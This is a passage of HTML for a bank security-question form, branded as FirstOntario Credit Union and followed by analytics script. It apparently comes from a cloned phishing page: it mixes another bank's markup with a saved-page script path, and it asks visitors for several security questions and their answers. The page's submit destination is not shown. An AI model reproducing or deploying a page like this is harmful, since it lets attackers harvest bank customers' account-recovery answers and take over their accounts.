                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							 <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer2" class="ng-pristine ng-untouched ng-valid form-control ng-empty">
                            </div>

                        </div>
                    </div>

                </div>

            </div>
        </div>
		  <div class="td-row">
            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">


                <div class="otp-section-mint-green otp-full-width-sm">

                    <div class="td-row">
                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							 <select required="" name="question3" class="td-layout-grid6" size="1" style="height:42px;width:340px">	
		<option value="" selected="selected">Select your security question</option>
					
					<option value="What is your spouse's/partner's middle name?" >What is your spouse's/partner's middle name?</option>
					
						<option value="What was the name of your first pet?" >What was the name of your first pet?</option>
					
						<option value="What was the last name of your favourite teacher in elementary school?" >What was the last name of your favourite teacher in elementary school?</option>
					
						<option value="What is the first name of your mother's oldest sibling?" >What is the first name of your mother's oldest sibling?</option>
					
						<option value="Who was your favourite athlete as a child?" >Who was your favourite athlete as a child?</option>
					
						<option value="What colour was your first car?" >What colour was your first car?</option>
					
						<option value="What is the name of the city where your father was born?" >What is the name of the city where your father was born?</option>
					
						<option value="What city were you born in?" >What city were you born in?</option>
					
						<option value="What was the name of your favourite superhero as a child?" >What was the name of your favourite superhero as a child?</option>
					
						<option value="What is the name of the city where your mother was born?" >What is the name of the city where your mother was born?</option>
					
						<option value="What was the last name of your favourite teacher in high school?" >What was the last name of your favourite teacher in high school?</option>
					
						<option value="What is the first name of the person you went to your prom with?" >What is the first name of the person you went to your prom with?</option>
					
						<option value="What is the street name where you lived when you were 10 years old?" >What is the street name where you lived when you were 10 years old?</option>
					
						<option value="What is your youngest child's middle name?" >What is your youngest child's middle name?</option>
					
						<option value="What is your mother's middle name?" >What is your mother's middle name?</option>
					
						<option value="What is the first name of the maid of honour at your wedding?" >What is the first name of the maid of honour at your wedding?</option>
					
						<option value="What is your favourite cartoon?" >What is your favourite cartoon?</option>
					
						<option value="What is your father's middle name?" >What is your father's middle name?</option>
					
						<option value="What is the first name of the best man at your wedding?" >What is the first name of the best man at your wedding?</option>
					
						<option value="What is the middle name of your oldest sibling?" >What is the middle name of your oldest sibling?</option>
					
						<option value="What was the first name of your first manager?" >What was the first name of your first manager?</option>
					
						<option value="What is your favourite musical instrument?" >What is your favourite musical instrument?</option>

						<option value="What is the first name of your oldest nephew?" >What is the first name of your oldest nephew?</option>
					
						<option value="What is the first name of your father's oldest sibling?" >What is the first name of your father's oldest sibling?</option>
					
						<option value="What is the first name of your oldest cousin?" >What is the first name of your oldest cousin?</option>
					
						<option value="What was the first name of your first roommate?" >What was the first name of your first roommate?</option>
					
						<option value="What is the first name of your spouse's/partner's father?" >What is the first name of your spouse's/partner's father?</option>
					
						<option value="What is the first name of your first friend?" >What is the first name of your first friend?</option>
					 
</select> </div>

                        </div>
                    </div>

                </div>

            </div>
        </div>
		  <div class="td-row">
            <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">


                <div class="otp-section-mint-green otp-full-width-sm">

                    <div class="td-row">
                        <div class="td-col-sm-6 td-col-sm-offset-3">

                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="Enter your Username or Access Card #" style=""> 
							  <input id="usernameOrAccessCard" placeholder="Enter your security answer" required="" name="answer3" ng-model="usernameOrAccessCard" class="ng-pristine ng-untouched ng-valid form-control ng-empty">
                             </div>

                        </div>
                    </div>

                </div>

            </div>
        </div>

		
        <div class="td-row">
            <div class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
                <div class="form-group">
                    <button type="submit" class="td-button  td-button" style="background-color:#0079c1;width:329px" >
                      <font color="white">  Next</font>
                    </button>
                </div>
            </div>
        </div>
    </form>

		</div>
	</div>



 

			<div class="clear">&nbsp;</div>
			<div class="banner">
				<div class="portlets banner"></div>
			</div>
		</div><!--/contentContainer-->
	</div><!--/outerContentContainer-->
	<div class="outerFooter" id="PageFooter">
		<div class="footer">
	<ul class="nav footer">
<li class="link0 even notcurrent id-YourPrivacy name-YourPrivacy_2012_07_17_33557 name-YourPrivacy"><a href="https://www.firstontariocu.com/Personal/AboutUs/OnlinePolicies/Privacy/" title="Your Privacy">Privacy</a></li>
<li class="link1 odd notcurrent id-Securityiseveryone39sresponsibility name-MDSecurity name-Securityiseveryone39sresponsibility"><a href="https://www.firstontariocu.com/Personal/AboutUs/OnlinePolicies/InternetSecurity/" title="Security is everyone&#39;s responsibility">Internet Security</a></li>
<li class="link2 even notcurrent id-Legal name-legal_content name-7003_2_content name-Legal"><a href="https://www.firstontariocu.com/Personal/AboutUs/OnlinePolicies/Legal/" title="Legal">Legal</a></li>
<li class="link3 odd notcurrent id-SiteMap name-section name-SiteMap"><a href="https://www.firstontariocu.com/Personal/ToolsAndCalculators/SiteMap/" title="Site Map">Site Map</a></li>
<li class="link5 linkN odd notcurrent id-AccessibilityStatement name-AccessibilityStatement"><a href="https://www.firstontariocu.com/Personal/AboutUs/OnlinePolicies/AccessibilityStatement/" title="Accessibility Statement">Accessibility Statement</a></li>
</ul>

	
		<div class="copyright">
			<p>FirstOntario Credit Union © Copyright 2018</p>	
		</div>
		
	<br>
		
</div><!--/footer-->
	</div><!--/outerFooter-->
</div><!-- /mdi -->

    
<script type="text/javascript">

var s_account='ccu-firstontariocu.com-prod';
</script>
<script type="text/javascript" language="JavaScript" src="./index_files/s_code.js.download"></script>
<script type="text/javascript"><!--
/* SiteCatalyst code version: h.23.8|v2.2
Copyright 1996-2011 Adobe, Inc. All Rights Reserved
More info available at http://www.omniture.com */

s.trackingServer = 'mdws.firstontariocu.com';
s.charSet = "ISO-8859-1";
s.formList = 'financialPlanningv2,mortgagev2,businessLoanv2,creditcardv2,termDepositv2,rrspv2,lineOfCreditv2,jobApplicationv2,contactUsv2,membershipv2,mdsbApplicationv2,retrieveFormv2,loanv2,corporateSponsorshipv2,chequeOrderv2,changeContactv2,TransferAdd,BillPay,CertapaySendTransfer,AccountNewDemand,OpenMembership';

if(typeof jQuery !== "undefined"){
	(function(){
		var bodyLangClass = "",
			catalystLanguage = "",
		
			catalystMemberStatus = "",
			catalystIsAuthenticated = false,
			catalystIsMember = false,
			catalystIsLoggedOut = false,	
		
			catalystProduct = "",
			catalystTeamSiteProduct = "",
			catalystTeamSiteProductAbbrv = "",
			catalystProductChannel = "",
			catalystChannel = "",	
			catalystContentCategory = "",
			catalystTeamSiteContentCategory = "", 	
			catalystCategory = "",
			catalystPageID = "",
			catalystSpecialCase = "",
			catalystEventArray,
			catalystUniqueEventArray,
			catalystUniqueEvents,
		
			catalystIsForm = false,
			catalystFormArray = [],
			catalystCompleteStatus = 0,
			catalystMemberType;
		
		catalystIsForm = (!!document.getElementById('wa_feature_client_id'));
		if(!!document.getElementById('wa_feature_status')){
			catalystCompleteStatus = document.getElementById('wa_feature_status').value;			
		}
		catalystFormArray=s.formList.split(",");
		if(!!catalystIsForm){
			var catalystFormName = "",
				catalystIsSavedForm = false,
				catalystStepName = "",
				catalystStepNumber = 0;			
		}
		
		var catalystIsSearch = false;
		catalystIsSearch = (!!document.getElementById('wa_feature_group') && document.getElementById('wa_feature_group').value === "Search");
		if(!!catalystIsSearch){
			var catalystSearchResults = "",
				searchterms = "",
				searchstring = "";
		}
		var catalystHierarchyArray = [],
			catalystHierarchy = "",
			catalystTeamSiteHierarchy2 = "",
			catalystTeamSiteHierarchy3 = "",	
			catalystHost,
			catalystLang,
			catalystIndex,			
			catalystIsError = false,
			catalystIsTeamSiteCampaign = "",
			catalystEvents = "",
			catalystPathName = "",
			catalystPattern = "",
			catalystCurrentDomain,
			catalystURLString = "",
			catalystQueryString = "";
		
		catalystCurrentDomain = window.location.hostname;
		s.linkInternalFilters = s.linkInternalFilters + "," + catalystCurrentDomain;
		catalystPathName = window.location.pathname;
		catalystPatternStart = /^\//;
		catalystPatternEnd = /\/$/;
		if(!!catalystPathName && !!catalystPathName.match(catalystPatternStart)){ 
			catalystURLString = catalystPathName.substring(1); 
			if(!!catalystURLString && !!catalystURLString.match(catalystPatternEnd)){
				catalystURLString = catalystURLString.substring(0,catalystURLString.length-1); 
			}
		}		
		if(catalystURLString.length > 0){
			catalystHierarchyArray = catalystURLString.split("\/");	
		}else{
			catalystHierarchyArray[0] = "root";
		}		
		for(i=0,len=catalystHierarchyArray.length; i<len; i++){
			catalystHost = /host/;
			if(!!catalystHierarchyArray[i] && !!catalystHierarchyArray[i].match(catalystHost)){
				catalystHierarchyArray.splice(i,2); 	 
			}
			if(!!catalystHierarchyArray[i]){
				catalystLang = /lang/;
				if(!!catalystHierarchyArray[i] && !!catalystHierarchyArray[i].match(catalystLang)){
					catalystHierarchyArray.splice(i,2);	 
				}
				catalystIndex = /\.jsp$/;
				if(!!catalystHierarchyArray[i] && !!catalystHierarchyArray[i].match(/\w+/) && !catalystHierarchyArray[i].match(catalystIndex)){
					catalystHierarchy += catalystHierarchyArray[i] + "|";
				}
			}			
		}
		if(catalystHierarchyArray[0] == undefined){
			catalystHierarchyArray[0] = "root";
		}

		
			
		
		catalystTeamSiteProduct = '';
		if(!!catalystTeamSiteProduct){
			catalystProduct = catalystTeamSiteProduct;
		}else{
			catalystProduct = catalystHierarchyArray[0];
		}
		s.channel = catalystProduct; 
		catalystTeamSiteProductAbbrv = '';
		if(!!catalystTeamSiteProductAbbrv){
			catalystProductChannel = catalystTeamSiteProductAbbrv;
		}else{
			if(catalystProduct.length > 4){
				catalystProductChannel = catalystProduct.substring(0,4);	
			}else{		
				catalystProductChannel = catalystProduct;
			}
		}
		

		
		s.prop1 = "nonmobile";
		catalystChannel = "w";
			

		s.prop23 = catalystChannel;
		
		catalystTeamSiteContentCategory = '';
		if(!!catalystTeamSiteContentCategory){
			catalystContentCategory = catalystTeamSiteContentCategory;
		}else{
			catalystContentCategory = '';
		}
		if(catalystContentCategory.charAt(0) == "\/"){
			catalystCategory = catalystContentCategory.substring(1);
		}else{
			catalystCategory = catalystContentCategory;	
		}
		s.prop24 = catalystCategory;
		
		catalystPageID = 'PersonalBanking';
		s.prop25=catalystPageID;
		
		if(!!catalystIsForm){
			
			if(!!document.getElementById('info_formid')){
				catalystFormName = document.getElementById('info_formid').value;
			}else if(!!document.getElementById('wa_feature_client_id')){
				catalystFormName = document.getElementById('wa_feature_client_id').value;
			}else{
				catalystFormName = "";
			}
			if(jQuery.inArray(catalystFormName,catalystFormArray) > -1){
				
				if(!!document.getElementById('wa_feature_step_number')){ 
					catalystStepNumber = document.getElementById('wa_feature_step_number').value; 
					catalystSpecialCase = "step" + catalystStepNumber.toString();
				}else{ 
					catalystStepNumber = 0; 
				}
				
				if(!!document.getElementById('info_stepname')){ 
					catalystStepName = document.getElementById('info_stepname').value;
					if(catalystStepName === "Save to Continue Later"){
						catalystSpecialCase = "saved";
					} 				
				}else{ 
					catalystStepName = "";
				}					
				s.eVar17 = catalystFormName;	
				s.prop29 = catalystStepName;
				s.eVar29 = catalystStepName;
			}
		}
		/* This handles the specialCase variable for IOP since we want to track each individual page */
		if(catalystPageID.toLowerCase() == 'interacpayment'){
			if(!!document.getElementById('wa_feature_step_number')){
				catalystStepNumber = document.getElementById('wa_feature_step_number').value; 
				if( catalystFormName.toLowerCase() == 'logon'){
					catalystSpecialCase = 'ioplogon-step' + catalystStepNumber;
				}else {
					catalystSpecialCase = 'iop-step' + catalystStepNumber;
				}
			}
		};

		//Handle online voting steps
		if(!!document.getElementById('wa_feature_client_id')){
			if(document.getElementById('wa_feature_client_id').value.toLowerCase() == 'onlinevoting'){
				if(!!document.getElementById('wa_feature_step_id')){
					catalystSpecialCase = document.getElementById('wa_feature_step_id').value.substr(4);	
				}	
			}
		}	

        if(!!document.getElementById('wa_feature_user_type')) {
            catalystMemberType = document.getElementById('wa_feature_user_type').value;
        }
        s.eVar32 = catalystMemberType;

		s.prop26 = catalystSpecialCase;
		
		s.pageName = catalystProductChannel + "|" + catalystChannel + "|" + catalystCategory + "|" + catalystPageID + "|" + catalystSpecialCase;
		
		catalystIsTeamSiteCampaign = '';
		if(!!catalystIsTeamSiteCampaign){
			s.campaign = catalystIsTeamSiteCampaign;			
		}
		
		if(!!catalystIsSearch){
			searchstring = document.getElementById('wa_feature_search_keywords').value;
			if(!!searchstring){
				s.prop7 = searchstring; 
			}
			catalystSearchResults = document.getElementById('wa_feature_search_results');
			if(!!catalystSearchResults){
				catalystSearchResults = document.getElementById('wa_feature_search_results').value;
			}
			s.prop10 = catalystSearchResults;
		}			
		
		s.server = "PROD";
		
		bodyLangClass = (' ' + document.getElementsByTagName('body')[0].className + ' ').match(/\sLang-([a-zA-Z]+)\s/);
		catalystLanguage = ( bodyLangClass != null && bodyLangClass.length > 0 )?bodyLangClass[1]:'en';
		s.prop12 = catalystLanguage;
		
		if(!!catalystHierarchy && catalystHierarchy.match(/|$/)){
			catalystHierarchy = catalystHierarchy.substring(0,catalystHierarchy.length-1);
		}
		s.hier1 = catalystHierarchy;
		catalystTeamSiteHierarchy2 = '';
		if(!!catalystTeamSiteHierarchy2){
			s.hier2 = catalystTeamSiteHierarchy2;
		}
		catalystTeamSiteHierarchy3 = '';
		if(!!catalystTeamSiteHierarchy3){
			s.hier3 = catalystTeamSiteHierarchy3;
		}
		
		catalystPattern = /^OnlineBanking/;
		if(!!catalystCategory && !!catalystCategory.match(catalystPattern)){ 
			s.prop15 = "secure";
		}else{
			s.prop15 = "public";
		}
		
		if(!!catalystIsMember){
			catalystMemberStatus = "member";
		}else{
			catalystMemberStatus = "nonmember";
		}
		s.prop27 = catalystMemberStatus;
		
		if(!!catalystIsMember){
			if(!!catalystIsAuthenticated){
				s.prop28 = "member/authenticated";
			}else{
				s.prop28 = "member/nonauthenticated";
			}
		}else{
			s.prop28 = "nonauthenticated";
		}
		
		
		
			
		if(!!catalystStepNumber && catalystStepNumber > 0){
			catalystEvents = catalystEvents + ",event" + catalystStepNumber.toString();
		}
		if(!!catalystIsSearch && (catalystSearchResults > 0)){
			catalystEvents = catalystEvents + ",event22";
		}
			
		var catalystTeamSiteEvents = '';
		if(!!catalystTeamSiteEvents){
			catalystEvents = catalystEvents + "," + catalystTeamSiteEvents;	
		}	
		if(!!catalystIsForm && catalystCompleteStatus == "1"){
			catalystEvents = catalystEvents + ",event33";	
		}
		function eliminateDuplicates(inArray){
			var i,
				out=[],
				obj={};
			for(i=0,len=inArray.length;i<len;i++){
				obj[inArray[i]]=0;
			}
			for(i in obj){
				out.push(i);
			}
			return out;
		}
		catalystEvents.split(" ").join(""); 
		if(catalystEvents.charAt(0) == ","){ 
			catalystEvents = catalystEvents.substring(1); 
		}
		catalystEventArray = catalystEvents.split(",");
		catalystUniqueEventArray = eliminateDuplicates(catalystEventArray);
		catalystUniqueEvents = catalystUniqueEventArray.join(',');
		s.events = catalystUniqueEvents;
		
		s.prop4 = "";
		if(typeof errorStatus !== "undefined"){
			s.pageType = "errorPage";
		}
	})();
}

var s_code=s.t();if(s_code)document.write(s_code)//--></script>
<script language="JavaScript" type="text/javascript"><!--
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
//--></script><noscript><img src="https://mdws.firstontariocu.com/b/ss/ccu-firstontariocu.com-prod/1/H.24.2--NS/0"
height="1" width="1" border="0" alt="" /></noscript><!--/DO NOT REMOVE/-->
<!-- End SiteCatalyst code version: H.24.2. -->







</body></html>